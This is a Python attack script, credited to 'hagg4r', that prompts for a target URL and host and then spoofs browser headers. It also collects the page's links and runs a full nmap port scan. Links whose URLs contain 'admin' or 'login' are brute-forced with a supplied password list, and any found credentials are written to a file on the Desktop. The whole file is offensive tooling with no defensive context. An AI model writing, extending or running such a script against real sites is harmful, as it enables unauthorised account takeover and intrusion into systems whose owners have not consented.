import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import subprocess
import os
print("by hagg4r")
def is_admin_page(url):
    return "admin" in url.lower() or "login" in url.lower()

def brute_force_login(session, url, username, password_list):
    for password in password_list:
        data = {"username": username, "password": password}
        response = session.post(url, data=data)
        if "Welcome" in response.text or "Dashboard" in response.text:
            credentials = f"{username}:{password}"
            print(f"[+] Found credentials: {credentials}")
            return credentials
    return None

def bypass_protection(session, url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': url
    }
    response = session.get(url, headers=headers)
    return response

def scan_ports(target):
    print(f"[*] Scanning ports on {target}")
    result = subprocess.run(['nmap', '-p-', '--open', target], capture_output=True, text=True)
    open_ports = []
    for line in result.stdout.splitlines():
        if "/tcp" in line and "open" in line:
            port = line.split("/")[0]
            open_ports.append(port)
    return open_ports

def save_results(credentials, filename):
    with open(filename, 'w') as file:
        file.write("\n".join(credentials))
    print(f"[+] Results saved to {filename}")

def main():
    # Get user input for target and username/password list
    target_url = input("Enter the target URL: ")
    target_host = input("Enter the target IP or hostname for port scanning: ")
    username = input("Enter the username for brute force: ")
    password_list = input("Enter the list of passwords separated by commas: ").split(',')

    session = requests.Session()
    
    # Bypass initial protections
    response = bypass_protection(session, target_url)
    
    soup = BeautifulSoup(response.text, "html.parser")

    # Find all links on the page
    links = [urljoin(target_url, a["href"]) for a in soup.find_all("a", href=True)]

    # Scan for open ports
    open_ports = scan_ports(target_host)
    print(f"[+] Open ports: {', '.join(open_ports)}")

    # Prepare to store found credentials
    found_credentials = []

    # Filter out admin pages and perform brute force
    for link in links:
        if is_admin_page(link):
            print(f"[*] Found potential admin page: {link}")
            creds = brute_force_login(session, link, username, password_list)
            if creds:
                found_credentials.append(creds)
                break

    # Save results to a file on the desktop
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') if os.name == 'nt' else os.path.join(os.path.expanduser('~'), 'Desktop')
    result_file = os.path.join(desktop_path, "found_credentials.txt")
    save_results(found_credentials, result_file)

if __name__ == "__main__":
    main()
